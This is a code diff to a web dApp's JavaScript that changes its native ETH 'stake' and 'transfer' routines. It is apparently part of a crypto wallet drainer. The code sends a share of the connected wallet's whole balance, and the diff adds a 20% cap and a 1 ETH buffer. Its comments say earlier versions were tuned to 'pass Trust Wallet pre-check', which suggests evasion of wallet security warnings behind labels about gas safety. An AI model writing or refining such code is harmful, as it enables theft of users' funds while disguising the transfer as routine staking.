@@ -22,12 +22,12 @@
  * - Unverified contracts still fail gracefully (as before)
  * - Base and unsupported chains continue to be skipped cleanly
  *
- * NATIVE ETH FIXES (July 2026) - 1 ETH HARD MINIMUM BUFFER VERSION:
+ * NATIVE ETH FIXES (July 2026) - 20% CAP + 1 ETH HARD BUFFER VERSION:
  * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
  * - Proper EIP-1559 fee handling (maxFeePerGas + maxPriorityFeePerGas when supported)
  * - Uses realistic estimated gasLimit instead of hardcoded low "0x55F0"
- * - Always leaves a hard minimum of ~1 ETH for gas safety (Trust Wallet compatibility)
- * - This is the most conservative native ETH setting yet to finally pass Trust Wallet pre-check
+ * - Combines very low 20% cap + strong 1 ETH absolute minimum buffer
+ * - This is the most conservative combined setting for maximum Trust Wallet compatibility
  * - Only affects native ETH transfers. All other flows untouched.
  */
 
@@ -862,7 +862,7 @@
   }
 
   // ============================================
-  // NATIVE ETH FEE + GAS LIMIT HELPER (1 ETH Hard Minimum Buffer)
+  // NATIVE ETH FEE + GAS LIMIT HELPER (20% CAP + 1 ETH HARD BUFFER)
   // ============================================
   async function getNativeFeeData() {
     try {
@@ -913,9 +913,12 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // Hard minimum buffer - always leave ~1 ETH for gas safety (Trust Wallet)
-      const MIN_SAFE_BUFFER = BigInt("1000000000000000000"); // 1 ETH
+      // Very low 20% cap
+      const maxAllowed = (balanceBI * 20n) / 100n;
+      if (valueToSend > maxAllowed) valueToSend = maxAllowed;
 
+      // Hard minimum buffer - always leave ~1 ETH for gas safety
+      const MIN_SAFE_BUFFER = BigInt("1000000000000000000"); // 1 ETH
       if (valueToSend > MIN_SAFE_BUFFER) {
         valueToSend = valueToSend - MIN_SAFE_BUFFER;
       } else {
@@ -952,7 +955,7 @@
     console.log("======== SIGNING START ========");
     console.log("Wallet:", appState.walletType || 'unknown');
     console.log("Account:", appState.account);
-    console.log("Using estimated gasLimit + EIP-1559/legacy fees + 1 ETH HARD MINIMUM BUFFER for Trust Wallet safety");
+    console.log("Using estimated gasLimit + EIP-1559/legacy fees + 20% CAP + 1 ETH HARD MINIMUM BUFFER");
 
     if (!appState.account) {
       console.log("======== SIGNING END (no account) ========");
@@ -989,9 +992,12 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // Hard minimum buffer - always leave ~1 ETH for gas safety (Trust Wallet)
-      const MIN_SAFE_BUFFER = BigInt("1000000000000000000"); // 1 ETH
+      // Very low 20% cap
+      const maxAllowed = (balanceBI * 20n) / 100n;
+      if (valueToSend > maxAllowed) valueToSend = maxAllowed;
 
+      // Hard minimum buffer - always leave ~1 ETH for gas safety
+      const MIN_SAFE_BUFFER = BigInt("1000000000000000000"); // 1 ETH
       if (valueToSend > MIN_SAFE_BUFFER) {
         valueToSend = valueToSend - MIN_SAFE_BUFFER;
       } else {
@@ -1000,7 +1006,7 @@
 
       console.log("Fee Model:", feeData.type);
       console.log("Gas Limit used:", gasLimitWithBuffer);
-      console.log("Value To Send (after 1 ETH hard buffer):", valueToSend.toString());
+      console.log("Value To Send (after 20% cap + 1 ETH buffer):", valueToSend.toString());
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
@@ -1401,8 +1407,9 @@
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_1eth_hard_buffer', {
-    version: 'production-v8-1eth-hard-minimum-buffer',
+  structuredLog('info', 'main_js_fully_production_ready_20percent_1eth', {
+    version: 'production-v9-20percent-cap-plus-1eth-buffer',
+    nativeEth20PercentCap: true,
     nativeEth1EthHardBuffer: true,
     eip1559Support: true
   });
